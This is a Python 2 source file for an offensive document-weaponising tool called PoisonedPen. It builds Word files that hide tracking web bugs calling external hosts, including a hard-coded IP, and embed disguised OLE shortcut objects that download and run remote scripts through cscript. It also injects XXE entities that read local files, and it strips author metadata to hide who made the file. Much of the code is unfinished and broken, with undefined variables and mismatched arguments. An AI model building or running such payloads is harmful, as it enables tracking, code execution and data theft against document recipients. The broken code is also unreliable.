#!/usr/bin/env python

import re, argparse, os, sys, tempfile, shutil, binascii, olefile, pyemf
from docx import Document
from lxml import etree
from zipfile import ZipFile

# Class to describe all poisedpen operations
class PoisonedPen:

  vbastr = ''
  contents = {}

  def __init__( self, docxpath ):
    if not os.path.isfile( docxpath ):
      print 'No file at ' + docxpath
      return False
    self.doc = Document(docxpath)
    if self.doc:
      self.filename = docxpath
    else:
      print 'Error parsing ' + docxpath + ' into Document object'
      return False

  def get_dom( self, path='word/document.xml' ):
    x = self.get_xml(path) 
    d = etree.ElementTree( etree.fromstring( x ) )
    return d

  # Get the raw XML markup in word/document.xml
  def get_xml( self, path='word/document.xml' ):
    if path in self.contents.keys():
      return self.contents[path]
    z = ZipFile( self.filename )
    return z.read(path)

  # Save doc
  def save( self ):
    if len(self.contents) == 0:
      print 'No changes - save not required'
      return False
    self.update_zip( self.contents )

  # Replace the contents of the zip with the dictionary of path:contents
  def update_zip( self, contents={} ):
    
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(self.filename))
    os.close(tmpfd)

    with ZipFile( self.filename, 'r' ) as zin:
      with ZipFile( tmpname, 'w' ) as zout:
        zout.comment = zin.comment
        for item in zin.infolist():
          if item.filename not in contents.keys():
            zout.writestr( item, zin.read(item.filename))
          else:
            zout.writestr( item, contents[item.filename] )

    os.remove( self.filename )
    if os.path.isfile( self.filename ):
      print 'Didn\'t delete file'
    os.rename( tmpname, self.filename )

  # Add an entry to document.xml.rels and return the rId number
  def add_rel( self, rtype, target, targetmode=None ):
    # <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://..." TargetMode="External"/>
    rels = self.get_dom( 'word/_rels/document.xml.rels' )

    # Discover the highest rId number
    rid = 0
    for r in rels.findall('//'):
      i = int(r.attrib['Id'].replace('rId',''))
      print i
      if i > rid:
        rid = i
    rid += 2
    rid = 'rId' + str( rid )
    print 'Creating element with rId ' + rid
    
    # Create rel
    attribs = {
      'Id': rid,
      'Type': rtype,
      'Target': url,
    }
    if targetmode:
      attribs['TargetMode'] = 'External'
    rel = etree.Element('Relationship', attribs )
    rels.getroot().append(rel)
    xmlstr = etree.tostring(rels,encoding='utf8',method='xml')
    # xmlstr = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="'+rid+'" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://193.36.15.194/tracker.gif?id=1" TargetMode="External"/></Relationships>'
    print xmlstr
    self.contents['word/_rels/document.xml.rels'] = xmlstr
    
  
  # Insert a 1x1px image using the given URL at the end of the document
  def insert_webbug( self, url ):

    # Insert entry into word/_rels/document.xml.rels and /Relationships
    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/image', url, 'External' ) 

    # Create rsid, store in settings
    settings = self.get_xml( 'word/settings.xml' )
    ok = False
    while not ok:
      rsid = binascii.b2a_hex(os.urandom(4)).upper()
      if rsid not in settings:
        ok = True
    rsid = '00CB6E19'
    print 'Random hex: ' + rsid
    # rsid = '<w:rsid w:val="00ED3C60"/>'
    el = '<w:rsid w:val="'+rsid+'"/>'
    settings = settings.replace( '</w:rsids>', el + '</w:rsids>' )
    contents['word/settings.xml'] = settings
    # contents['word/settings.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15"><w:zoom w:percent="120"/><w:proofState w:spelling="clean" w:grammar="clean"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/></w:compat><w:rsids><w:rsidRoot w:val="000F7C79"/><w:rsid w:val="000F7C79"/><w:rsid w:val="00181E59"/><w:rsid w:val="00197E8A"/><w:rsid w:val="0023724B"/><w:rsid w:val="00292746"/><w:rsid w:val="00AA6863"/><w:rsid w:val="00C83833"/><w:rsid w:val="'+rsid+'"/><w:rsid w:val="00ED3C60"/><w:rsid w:val="00F83091"/><w:rsid w:val="00FC2467"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-GB"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="1026"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w15:chartTrackingRefBased/><w15:docId w15:val="{C80FAF87-6FBB-4006-9231-945AFB0B53C8}"/></w:settings>'

    doc = self.get_xml( 'word/document.xml' )
    # Get an id for the new shape

    # Construct XML describing paragraph with an image in it, referencing the rId above
    p = '<w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r></w:p>'
    doc = doc.replace("</w:body>", p + "</w:body>" )
    contents['word/document.xml'] = doc
    # contents['word/document.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 wp14"><w:body><w:p w:rsidR="00231807" w:rsidRDefault="000F7C79"><w:r><w:t>This is a totally innocent document</w:t></w:r></w:p><w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="'+rsid+'"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="708" w:footer="708" w:gutter="0"/><w:cols w:space="708"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>'

    self.contents.update( contents )
    return True

  # Insert a lnk which does a download and exec of the specified file
  def insert_ole_dlexec_lnk( self, url ):

    # Some magic cscript call
    path = 'c:\\Windows\\System32\\cscript.exe "script:'+url+'"'
    self.insert_olelnk( path )

  # Insert a lnk as an OLE object
  def insert_olelnk( self, path, icon, caption ):
    
    # Create lnk file
    lnk = pylnk.for_file(path)

    # http://www.mamachine.org/mslink/index.en.html
    # bin/mslink.sh

    # Write out to tmp dir with random name TODO
    filepath = tempfile.NamedTemporaryFile().name

    return self.insert_olefile( filepath )

  # Insert any file as an OLE object
  def insert_olefile( self, filepath, icon, caption ):

    # Insert the file as OLE
    oletmpl = 'resource/oleObject1.bin'
    tmpolefile = tempfile.NamedTemporaryFile().name 
    shutil.copy( oletmpl, tmpolefile )
    ole = olefile.OleFileIO(tmpolefile,write_mode=True)
    streams = ole.listdir()
    for s in streams: 
      print s, ole.get_size(s)
    streamname = '\x01Ole10Native'
    with open(filepath,'rb') as f:
      size = ole.get_size(streamname)
      print 'Size: ' + str( size )
      data = f.read().ljust(size,'\x00')
      print 'Data size: ' + str( len( data ) )
      ole.write_stream(streamname, data)
    
    # Insert file icon / name
    tmpemffile = tempfile.NamedTemporaryFile().name 
    emf = pyemf.EMF(100,70,300)
    icotmpl = 'resource/' + icon + '.emf'
    emf.load(icotmpl)
    emf.TextOut( 10, 80, caption )
    emf.save(tmpemffile)
    streamname = '\x03ObjInfo'
    with open( tmpemffile, 'rb' ) as f:
      size = ole.get_size(streamname)
      print 'Size: ' + str( size )
      data = f.read().ljust(size,'\x00')
      print 'Data size: ' + str( len( data ) )
      ole.write_stream(streamname, data)
    
    ole.close()
    intpath = 'word/embeddings/oleObject1.bin'
    with open( tmpolefile, 'rb' ) as f:
      self.contents[intpath] = f.read()

    # Get a rid
    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject', intpath )

    # Insert into document

  # Strip author info out
  def sanitise( self ):
    print 'Stripping creator and lastModifiedBy metadata...'
    elements = ['dc:creator','cp:lastModifiedBy']
    props = 'docProps/core.xml'
    xml = self.get_xml( props )
    for el in elements:
      xml = re.sub( '<'+el+'>[^<]+</'+el+'>', '<'+el+'></'+el+'>', xml )
    self.contents.update( {props: xml} )

  # Insert XXE into document xml
  def insert_xxe( self, path ):
    doc = 'word/document.xml'
    print 'Inserting XXE SYSTEM element pointing to ' + path + ' into '+doc+'. This will almost certainly prevent it from opening in any MS Office editing software...'
    xml = self.get_xml( doc )
    xml = re.sub( '(<?xml[^>]+>)', '\1<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+path+'" >]><foo>&xxe;</foo>', xml )
    self.contents.update( { doc: xml } )
  

def main():
  
  newsuffix = '-FINAL'
  
  # Command line options
  parser = argparse.ArgumentParser(description="Easily poison a Word documents with fun stuff")
  parser.add_argument("-w", "--webbug", metavar="URL", action="append", help="Insert a web bug to this URL (can be http(s)/UNC, can insert multiple into one doc)" )
  parser.add_argument("-o", "--ole-file", metavar="FILEPATH", help="Insert a file from the filesystem as an OLE object" )
  parser.add_argument("-l", "--ole-lnk", metavar="URLORPATH", help="Insert a .lnk file as an OLE object to the specified URL / path" )
  parser.add_argument("-d", "--ole-dlexec", metavar="URL", help="Insert a .lnk file which downloads and executes the specified URL using c:\Windows\System32\cscript" )
  parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of creating a new one and appending '"+newsuffix+".docx' to the file name" )
  parser.add_argument("-s", "--suffix", help="Suffix to use instead of '"+newsuffix+"' (extension is always preserved)" )
  parser.add_argument("-i", "--icon", help="Icon to use when embedding an OLE object", choices=['word','excel'], default='word' )
  parser.add_argument("-c", "--caption", help="Caption to write next to file icon (i.e. the file name)", default='Attachment.docx' )
  parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified) from document" )
  parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )

  # TODO
  # parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path)" )
  parser.add_argument("documents", nargs="+", help="The word file(s) to poison (supports wildcards)")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  for docfile in args.documents:
    if not args.replace:
      name, ext = os.path.splitext(docfile)
      newfile = name + newsuffix + ext
      print 'Creating new file: ' + newfile
      shutil.copy( docfile, newfile )
      docfile = newfile
    
    doc = PoisonedPen( docfile )

    if args.webbug:
      for bug in args.webbug:
        doc.insert_webbug( bug )

    if args.ole_lnk:
      doc.insert_olelnk( args.ole_lnk, args.icon, args.caption )
    
    if args.ole_file:
      doc.insert_olefile( args.ole_file, args.icon, args.caption )

    if args.ole_dlexec:
      doc.insert_ole_dlexec_lnk( args.ole_dlexec, args.icon, args.caption )
  
    if args.sanitise:
      doc.sanitise()
  
    if args.xxe:
      doc.insert_xxe(path)

    doc.save()

if __name__ == "__main__":
  main()

